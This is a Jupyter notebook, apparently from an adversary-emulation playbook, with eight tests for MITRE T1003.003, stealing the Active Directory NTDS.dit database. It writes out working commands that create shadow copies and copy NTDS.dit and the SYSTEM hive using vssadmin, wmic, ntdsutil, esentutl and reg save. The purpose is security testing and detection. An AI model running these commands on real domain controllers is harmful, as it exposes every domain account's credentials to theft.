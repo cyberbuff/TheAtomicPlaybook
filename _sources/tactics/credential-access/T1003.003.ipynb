{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3c17859a",
   "metadata": {},
   "source": "# T1003.003 - NTDS\nAdversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n"
  },
  {
   "cell_type": "markdown",
   "id": "758b1fba",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "75f9c90c",
   "metadata": {},
   "source": "### Atomic Test #1 - Create Volume Shadow Copy with vssadmin\nThis test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Target must be a Domain Controller\n\n##### Check Prereq Commands:\n```cmd\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry, Promoting this machine to a Domain Controller must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bb61d8a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f371c8e7",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nvssadmin.exe create shadow /for=C:\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d704c0cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a6ee9b6c",
   "metadata": {},
   "source": "### Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy\nThis test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Target must be a Domain Controller\n\n##### Check Prereq Commands:\n```cmd\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry, Promoting this machine to a Domain Controller must be done manually\n\n```\n##### Description: Volume shadow copy must exist\n\n##### Check Prereq Commands:\n```cmd\nif not exist \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 (exit /b 1)\n\n```\n##### Get Prereq Commands:\n```cmd\necho Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement\n\n```\n##### Description: Extract path must exist\n\n##### Check Prereq Commands:\n```cmd\nif not exist C:\\Windows\\Temp (exit /b 1)\n\n```\n##### Get Prereq Commands:\n```cmd\nmkdir C:\\Windows\\Temp\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "57ddd245",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "aec4f59c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59972e27",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "e168feb5",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel \"C:\\Windows\\Temp\\ntds.dit\"        >nul 2> nul\ndel \"C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"C:\\Windows\\Temp\\SYSTEM_HIVE\"     >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e7c12c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "579b4933",
   "metadata": {},
   "source": "### Atomic Test #3 - Dump Active Directory Database with NTDSUtil\nThis test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Target must be a Domain Controller\n\n##### Check Prereq Commands:\n```cmd\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry, Promoting this machine to a Domain Controller must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7145d30b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "53f65803",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmkdir C:\\Windows\\Temp\\ntds_T1003\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a44e6b95",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "9e11c694",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nrmdir /q /s C:\\Windows\\Temp\\ntds_T1003 >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c48cec7b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5d17be43",
   "metadata": {},
   "source": "### Atomic Test #4 - Create Volume Shadow Copy with WMI\nThis test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Target must be a Domain Controller\n\n##### Check Prereq Commands:\n```cmd\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry, Promoting this machine to a Domain Controller must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ace069b5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2654080a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic shadowcopy call create Volume=C:\\\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9d865c0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "86092389",
   "metadata": {},
   "source": "### Atomic Test #5 - Create Volume Shadow Copy remotely with WMI\nThis test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Target must be a reachable Domain Controller, and current context must be domain admin\n\n##### Check Prereq Commands:\n```cmd\nwmic /node:\"localhost\" shadowcopy list brief\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "912e358e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2ceee5ec",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic /node:\"localhost\" shadowcopy call create Volume=C:\\\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ec1ee502",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f38aeb04",
   "metadata": {},
   "source": "### Atomic Test #6 - Create Volume Shadow Copy remotely (WMI) with esentutl\nThis test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Target must be a reachable Domain Controller, and current context must be domain admin\n\n##### Check Prereq Commands:\n```cmd\nwmic /node:\"localhost\" shadowcopy list brief\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc834953",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d7d4d90e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic /node:\"localhost\" process call create \"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bdf272b1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "121dd9b4",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Create Volume Shadow Copy with Powershell",
    "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12abc649",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "694c3874",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Create Symlink to Volume Shadow Copy",
    "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nvssadmin.exe create shadow /for=C:\nmklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "898dc599",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.003 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "c18272c6",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}